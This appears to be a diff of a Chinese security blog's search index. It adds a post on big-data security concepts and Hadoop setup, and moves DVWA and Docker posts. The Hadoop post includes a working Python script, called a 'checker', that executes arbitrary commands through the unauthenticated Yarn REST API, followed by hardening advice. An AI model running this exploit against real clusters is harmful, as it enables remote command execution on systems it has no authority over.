@@ -1,6 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[大数据安全入门-Hadoop]]></title>
+    <url>%2F2018%2F09%2F29%2FHadoop%2F</url>
+    <content type="text"><![CDATA[0x00前言近期入门大数据安全，分享一下Win10搭建Hadoop问题、相关安全概念和Hadoop Yarn REST API未授权命令执行漏洞 0x01环境安装 1.win10安装Hadoop集群参考链接Step-by-step-Hadoop-2.8.0-installation-on-Window-10 注意事项：hadoop-env.cmd文件中JAVA_HOME需要用双引号包裹，而且路径不能包括空格，否则报错：set JAVA_HOME=&quot;C:\jdk1.8.0_171&quot; 2.Docker快速搭建Hadoop集群 1docker run -d -P sequenceiq/hadoop-docker 3.Hadoop入门”hello world”之MapReduce计数案例How to Run Hadoop wordcount MapReduce Example on Windows 10 0x01基本概念 大数据具备4V的特征，即：variety（多样化）、volume（海量化）、velocity（快速化）、value（价值低密度） 传输交换安全是指保障与外部系统交换数据过程的安全可控，需要采用接口鉴权等机制，对外部系统的合法性进行验证，采用通道加密等手段保障传输过程的机密性和完整性。 存储安全是指对平台中的数据设置备份与恢复机制，并采用数据访问控制机制来防止数据的越权访问。计算组件应提供相应的身份认证和访问控制机制，确保只有合法的用户或应用程序才能发起数据处理请求。 平台管理安全包括平台组件的安全配置、资源安全调度、补丁管理、安全审计等内容。此外，平台软硬件基础设施的物理安全、网络安全、虚拟化安全等是大数据平台安全运行的基础 数据“可用不可见”，是大数据环境下数据安全的新需求 0x02安全威胁与技术 数据的真实性和完整性校验困难。黑客利用网络攻击向数据采集端注入脏数据，会破坏数据真实性，故意将数据分析的结果引向预设的方向，进而实现操纵分析结果的攻击目的 大数据DLP 防护技术：针对使用泄露和存储泄露，通常采用身份认证管理、进程监控、日志分析和安全审计等技术手段，观察和记录操作员对计算机、文件、软件和数据的操作情况，发现、识别、监控计算机中的敏感数据的使用和流动，对敏感数据的违规使用进行警告、阻断等。针对传输泄露，通常采取敏感数据动态识别、动态加密、访问阻断、和数据库防火墙等技术，监控服务器、终端以及网络中动态传输的敏感数据，发现和阻止敏感数据通过聊天工具、网盘、微博、FTP、论坛等方式泄露出去 密文计算技术：同态加密和安全多方计算等密文计算方法（SMPC）为解决这个难题提供了一种有效的解决思路 同态加密提供了一种对加密数据进行处理的功能，对经过同态加密的数据处理得到一个输出，将这一输出进行解密，其结果与统一方法处理未加密的原始数据得到的输出结果一致。 安全多方计算（SecureMulti-PartyComputation, SMPC）是解决一组互不信任的参与方之间保护隐私的协同计算问题，SMPC要确保输入的独立性，计算的正确性，同时不泄露各输入值给参与计算的其他成员。 数字水印和数据血缘追踪技术 数字水印技术是为了保持对分发后的数据流向追踪，在数据泄露行为发生后，对造成数据泄露的源头可进行回溯 数据血缘(Lineage，Provenance，Pedigree)亦可译为血统、起源、世系、谱系，是指数据产生的链路，数据血缘记载了对数据处理的整个历史，包括数据的起源和处理这些数据的所有后继过程。 数据脱敏技术 第一种加密方法，是指标准的加密算法，加密后完全失去业务属性，属于低层次脱敏。算法开销大，适用于机密性要求高、不需要保持业务属性的场景。 第二种基于数据失真的技术，最常用的是随机干扰、乱序等，是不可逆算法，通过这种算法可以生成“看起来很真实的假数据”。适用于群体信息统计或（和）需要保持业务属性的场景。 第三种可逆的置换算法，兼具可逆和保证业务属性的特征，可以通过位置变换、表映射、算法映射等方式实现。 数据匿名化算法可以实现根据具体情况有条件地发布部分数据，或者数据的部分属性内容，包括差分隐私、K 匿名、L 多样性、T 接近等 0x03Hadoop Yarn REST API未授权命令执行漏洞检测 参考链接：Hadoop Yarn REST API 未授权漏洞利用挖矿分析1.漏洞检测使用curl不是很方便，于是写一个无缝支持python2和python3的脚本进行漏洞检测.123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#!/usr/bin/python# -*- coding:utf8 -*-import sysimport jsonimport refrom optparse import OptionParser is_py2 = (sys.version_info[0] == 2)if is_py2: import urllib2else: import urllib.requestdef get_application_id(ip,port): url='http://%s:%s/ws/v1/cluster/apps/new-application' % (ip,port) if is_py2: request = urllib2.Request(url=url,data="") html = urllib2.urlopen(request) else: request = urllib.request.Request(url=url,data="".encode("utf-8")) html= urllib.request.urlopen(request) status_code=html.code if status_code==200: data=json.loads(html.readline()) app_id=data['application-id'] return app_id else: print_color('[-] Get application-id error ! ','red') print_color(html.readline(),'red')def excute_cmd(ip,port,command,app_id): url='http://%s:%s/ws/v1/cluster/apps' % (ip,port) payload=&#123; "am-container-spec":&#123;"commands":&#123;"command":command&#125;&#125;, "application-id":app_id, "application-name":"test", "application-type":"YARN" &#125; if is_py2: request = urllib2.Request(url=url,data=json.dumps(payload)) request.add_header('Content-Type', 'application/json') html = urllib2.urlopen(request) else: request = urllib.request.Request(url=url,data=json.dumps(payload).encode('utf-8')) request.add_header('Content-Type', 'application/json') html= urllib.request.urlopen(request) status_code=html.code if status_code==202: print_color('[+] The command may be executed successfully.','blue') return app_id else: print_color('[-] error ! ','red') print_color(html.readline(),'red')def print_color(data,color="white"): if color == 'green': print('\033[1;32m%s\033[1;m' % data) elif color == 'blue' : print('\033[1;34m%s\033[1;m' % data) elif color=='gray' : print('\033[1;30m%s\033[1;m' % data) elif color=='red' : print('\033[1;31m%s\033[1;m' % data) elif color=='yellow' : print('\033[1;33m%s\033[1;m' % data) elif color=='magenta' : print('\033[1;35m%s\033[1;m' % data) elif color=='cyan' : print('\033[1;36m%s\033[1;m' % data) elif color=='white' : print('\033[1;37m%s\033[1;m' % data) elif color=='crimson' : print('\033[1;38m%s\033[1;m' % data) else : print(data)logo='''An Hadoop Yarn REST API unauthorized RCE checker, which supports python2 and python3'''def main(): print_color(logo,'green') parser = OptionParser() parser.add_option("--ip", dest="ip", help="IP addresses for Hadoop Yarn REST API. Ex: 127.0.0.1") parser.add_option("-p","--port",dest="port",default="8088", help="The port for Hadoop Yarn REST API, default：8088") parser.add_option("-c","--command", dest="command", default="whoami &gt; /tmp/hacked.txt",help='Command to execute,default: "whoami &gt; /tmp/hacked.txt"') (options, args) = parser.parse_args() if not options.ip: parser.print_help() exit() app_id=get_application_id(options.ip,options.port) excute_cmd(options.ip,options.port,options.command,app_id) if __name__ == '__main__': main() 安全加固 通过iptables或者安全组配置访问策略，限制对8088等端口的访问 尽量不要将接口开放在公网，改为本地或者内网调用 使用最新版Hadoop并启用Kerberos认证功能，禁止匿名访 提示:本博客里任何文章/动画/教程以及各类软件/工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负。]]></content>
+      <categories>
+        <category>大数据</category>
+      </categories>
+      <tags>
+        <tag>Security</tag>
+        <tag>大数据</tag>
+        <tag>Hadoop</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[online-checker基于python实现的批量URL在线存活检测工具]]></title>
     <url>%2F2018%2F08%2F10%2Fonline-checker%2F</url>
     <content type="text"><![CDATA[0x00前言一款基于python实现的批量URL在线存活检测工具,无缝自适应支持python2和python3。Github地址 0x02 online-checkerAn adaptive URL online checker for python2 and python3基于python实现的批量URL在线存活检测工具 无缝自适应支持python2和python3 采用python默认模块，无需安装任何第三方模块即可使用 多线程快速检测 12345678910 ___ _ _ ___ _ _ /___\_ __ | (_)_ __ ___ / __\ |__ ___ ___| | _____ _ __ // // '_ \| | | '_ \ / _ \ / / | '_ \ / _ \/ __| |/ / _ \ '__|/ \_//| | | | | | | | | __/ / /___| | | | __/ (__| &lt; __/ |\___/ |_| |_|_|_|_| |_|\___| \____/|_| |_|\___|\___|_|\_\___|_|An adaptive URL online checker for python2 and python3Usage: python online-checker.py filename]]></content>
@@ -124,8 +137,8 @@
       </categories>
       <tags>
         <tag>Security</tag>
-        <tag>数据库</tag>
         <tag>Mysql</tag>
+        <tag>数据库</tag>
       </tags>
   </entry>
   <entry>
@@ -366,17 +379,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[温故而知新-DVWA]]></title>
-    <url>%2F2016%2F12%2F08%2Fdvwa%2F</url>
-    <content type="text"><![CDATA[0x00前言&emsp;&emsp;最近涉猎docker,用docker搭建了DVWA1.9版本，正好把DVWA又重新测试一遍，记录几点安全方面的感悟 0x01感悟1.后台爆破 通常的网站采用验证码的方式防止爆破，然而不少网站验证码过于简单，可以利用验证码识别后继续爆破，还有部分网站验证码可以重复使用，导致验证码形同虚设。 较为安全的后台防止爆破可以采用每次请求附带随机token的方式，可以防止不同的burp爆破,不过不能防止利用脚本获取页面后提交爆破。 geetest验证码通过机器学习判断是否为人为验证，然后返回一个validate，认证需要带上validate，可以防止简单的脚本爆破和burp爆破 最简单最安全的方式是错误次数限制,达到错误阈值后锁定用（ATM机取款仅仅有6位密码也是通过限制错误次数的保障用户的资金安全。） 2.CSRF CSRF主要应用在用户已登录的情况下，通过诱骗用户点击（或者执行加载）恶意链接，向合法的应用服务以用户的身份发送请求，在缺乏防范的时候造成删除文件、添加用户、修改密码等严重后果。 一般情况通过请求携带Token的方式防止CSRF攻击，不过，当网站存在XSS时：利用XSS获取Token，然后发起CSRF请求也可能导致攻击成功。 防止此类漏洞的有效手段是请求页面带Token,并且在敏感操作时要求再次用户确认（比如输入原始密码，提醒是否确定删除。） 3.命令注入 防止命令注入，主要是严格限定输入满足程序的要求，通过正则匹配满足预定输入（比如ip,必须为数字等），或者通过白名单方式限定输入 4.文件上传 文件上传有通过前端限制、黑名单上传类型限制、验证文件后缀、验证文件头，关键函数过滤等多种常见的方式，然而这些方法总存在绕过的漏洞和威胁，切实有效的方法是通过白名单限制上传的文件类型并在服务器端对文件进行重命名操作。 文件包含漏洞+上传可能导致绕过上传限制机制造成攻击 5.SQL注入之MySQL函数CONCAT,CONCAT_WS,GROUP_CONCAT对比(1)CONCAT(str1,str2,…)返回结果为连接参数产生的字符串,可以有一个或多个参数。如有任何一个参数为NULL ，则返回值为NULL。 (2)CONCAT_WS(separator,str1,str2,…),返回结果为以separator为分割符的字符串,此函数会忽略参数中的NULL值(如果分割符为NULL,如：select CONCAT_WS(NULL,user_id,last_name,first_name) from users;则返回结果为NULL) 测试CONCAT和CONCAT_WS处理NULL的区别：将Bob的last_name设置为NULL以后update users set last_name=NULL where user_id=5，比较CONCAT和CONCAT_WS的结果,可以看到CONCAT返回为NULL,而CONCAT_WS只是忽略了NULL的字符部分，其他正常显示 (3)GROUP_CONCAT([DISTINCT] expr [,expr …][ORDER BY {unsigned_integer | col_name | formula} [ASC | DESC] [,col …]][SEPARATOR str_val])函数返回带有来自一个组的连接的非NULL值的字符串，其中为需要将返回结果去重时使用DISTINCT，需要排序是使用ORDER BY，需要制定分割符是用SEPARATOR(默认是’,’) 将GROUP_CONCAT联合CONCAT_WS或CONCAT使用(NULL的结果已经被过滤)： 0x02总结 白名单比黑名单安全 最小化限制输入范围（限制只能内网访问比全网访问安全，限制数字比所有字符安全，重命名比采用用户输入文件名更安全）]]></content>
-      <categories>
-        <category>Security</category>
-      </categories>
-      <tags>
-        <tag>Security</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[涉猎Docker]]></title>
     <url>%2F2016%2F12%2F08%2Fdocker%2F</url>
     <content type="text"><![CDATA[0x00前言&emsp;&emsp;初步接触Docker，记录一下安装过程和常用命令，同时安装nsenter可以十分方便地进入Docker进行管理。 0x01实践官方安装教程1.检测操作系统内核版本1uname -a 返回如下:1Ubuntu 14.04.5 LTS (GNU/Linux 3.13.0-101-generic x86_64) 2.Docker安装更新源 1sudo apt-get update 安装对apt对https的支持和ca证书1sudo apt-get install apt-transport-https ca-certificates 添加Docker的密钥及源文件12sudo apt-key adv --keyserver hkp://ha.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609Decho "deb https://apt.dockerproject.org/repo ubuntu-trusty main" | sudo tee /etc/apt/sources.list.d/docker.list 更新Docker源并安装Docker123sudo apt-get updatesudo apt-get install docker-enginesudo service docker start # 提示无此服务是执行reboot 3.常用命令搜索docker镜像1sudo docker search 获取ubuntu镜像 1sudo docker pull ubuntu 查看已获取docker镜像1sudo docker images 命令行运行docker(命名为ubuntu_test,-t -i指定命令行方式，并启动bash，输入exit退出docker)1sudo docker run --name ubuntu_test -i -t ubuntu /bin/bash 后台运行docker,并映射端口到宿主机(后台运行tutum/lamp镜像，并把docker的80端口映射到宿主机8080,3306映射到宿主机3306,可以访问宿主机的8080端口获取docker的web服务) 1sudo docker run -d -p 8080:80 -p 3306:3306 --name lamp_test tutum/lamp 查看所有的docker(运行和停止的，并获取到docker的id和name唯一标识符)1sudo docker ps -a 已创建docker的启动、停止、重启（指定唯一标识符id或name,以ubuntu_test 为例）123sudo docker start ubuntu_test sudo docker stop ubuntu_test sudo docker restart ubuntu_test 删除docker实例（指定唯一标识符id或name,以ubuntu_test 为例）1sudo rm ubuntu_test 删除docker镜像（指定镜像标识符，以获取的ubuntu镜像为例）1sudo rmi ubuntu 4.安装nsenter进入docker（已过时，使用docker exec -it container_id /bin/bash）docker在不易后台方式运行时，退出以后docker示例就停止运行，然而后台方式运行情况下，如何进入docker内部执行相关操作就十分重要了(1)安装（笔者环境为Ubuntu 14.04.5 LTS）方式1.安装官方最新版打开连接https://www.kernel.org/pub/linux/utils/util-linux/选择最新版本，复制链接地址下载安装文件(以2.29为例) 1234567wget https://www.kernel.org/pub/linux/utils/util-linux/v2.29/util-linux-2.29.tar.gztar -zxvf util-linux-2.29.tar.gzlscd util-linux-2.29./configure --without-python --disable-all-programs --enable-nsenter --without-ncursesmake nsentercp nsenter /usr/local/bin 方式2.一键安装（使用https://github.com/jpetazzo/nsenter的docker镜像安装）1sudo docker run --rm -v /usr/local/bin:/target jpetazzo/nsenter (2)nsenter使用其中container_name_or_ID修改为需要进入docker的唯一标识符id或name1nsenter --target $(docker inspect --format \&#123;\&#123;.State.Pid\&#125;\&#125; container_name_or_ID) --mount --uts --ipc --net --pid 以lamp_test为例，执行如下命令直接进入docker内部1sudo nsenter --target $(sudo docker inspect --format \&#123;\&#123;.State.Pid\&#125;\&#125; lamp_test) --mount --uts --ipc --net --pid 0x02其他 docker使用nanoexport TERM=xterm docker挂载目录docker run -it -v /home/dock/Downloads:/usr/Downloads ubuntu64 /bin/bash]]></content>
@@ -386,6 +388,17 @@
       <tags>
         <tag>Docker</tag>
         <tag>Ubuntu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[温故而知新-DVWA]]></title>
+    <url>%2F2016%2F12%2F08%2Fdvwa%2F</url>
+    <content type="text"><![CDATA[0x00前言&emsp;&emsp;最近涉猎docker,用docker搭建了DVWA1.9版本，正好把DVWA又重新测试一遍，记录几点安全方面的感悟 0x01感悟1.后台爆破 通常的网站采用验证码的方式防止爆破，然而不少网站验证码过于简单，可以利用验证码识别后继续爆破，还有部分网站验证码可以重复使用，导致验证码形同虚设。 较为安全的后台防止爆破可以采用每次请求附带随机token的方式，可以防止不同的burp爆破,不过不能防止利用脚本获取页面后提交爆破。 geetest验证码通过机器学习判断是否为人为验证，然后返回一个validate，认证需要带上validate，可以防止简单的脚本爆破和burp爆破 最简单最安全的方式是错误次数限制,达到错误阈值后锁定用（ATM机取款仅仅有6位密码也是通过限制错误次数的保障用户的资金安全。） 2.CSRF CSRF主要应用在用户已登录的情况下，通过诱骗用户点击（或者执行加载）恶意链接，向合法的应用服务以用户的身份发送请求，在缺乏防范的时候造成删除文件、添加用户、修改密码等严重后果。 一般情况通过请求携带Token的方式防止CSRF攻击，不过，当网站存在XSS时：利用XSS获取Token，然后发起CSRF请求也可能导致攻击成功。 防止此类漏洞的有效手段是请求页面带Token,并且在敏感操作时要求再次用户确认（比如输入原始密码，提醒是否确定删除。） 3.命令注入 防止命令注入，主要是严格限定输入满足程序的要求，通过正则匹配满足预定输入（比如ip,必须为数字等），或者通过白名单方式限定输入 4.文件上传 文件上传有通过前端限制、黑名单上传类型限制、验证文件后缀、验证文件头，关键函数过滤等多种常见的方式，然而这些方法总存在绕过的漏洞和威胁，切实有效的方法是通过白名单限制上传的文件类型并在服务器端对文件进行重命名操作。 文件包含漏洞+上传可能导致绕过上传限制机制造成攻击 5.SQL注入之MySQL函数CONCAT,CONCAT_WS,GROUP_CONCAT对比(1)CONCAT(str1,str2,…)返回结果为连接参数产生的字符串,可以有一个或多个参数。如有任何一个参数为NULL ，则返回值为NULL。 (2)CONCAT_WS(separator,str1,str2,…),返回结果为以separator为分割符的字符串,此函数会忽略参数中的NULL值(如果分割符为NULL,如：select CONCAT_WS(NULL,user_id,last_name,first_name) from users;则返回结果为NULL) 测试CONCAT和CONCAT_WS处理NULL的区别：将Bob的last_name设置为NULL以后update users set last_name=NULL where user_id=5，比较CONCAT和CONCAT_WS的结果,可以看到CONCAT返回为NULL,而CONCAT_WS只是忽略了NULL的字符部分，其他正常显示 (3)GROUP_CONCAT([DISTINCT] expr [,expr …][ORDER BY {unsigned_integer | col_name | formula} [ASC | DESC] [,col …]][SEPARATOR str_val])函数返回带有来自一个组的连接的非NULL值的字符串，其中为需要将返回结果去重时使用DISTINCT，需要排序是使用ORDER BY，需要制定分割符是用SEPARATOR(默认是’,’) 将GROUP_CONCAT联合CONCAT_WS或CONCAT使用(NULL的结果已经被过滤)： 0x02总结 白名单比黑名单安全 最小化限制输入范围（限制只能内网访问比全网访问安全，限制数字比所有字符安全，重命名比采用用户输入文件名更安全）]]></content>
+      <categories>
+        <category>Security</category>
+      </categories>
+      <tags>
+        <tag>Security</tag>
       </tags>
   </entry>
   <entry>
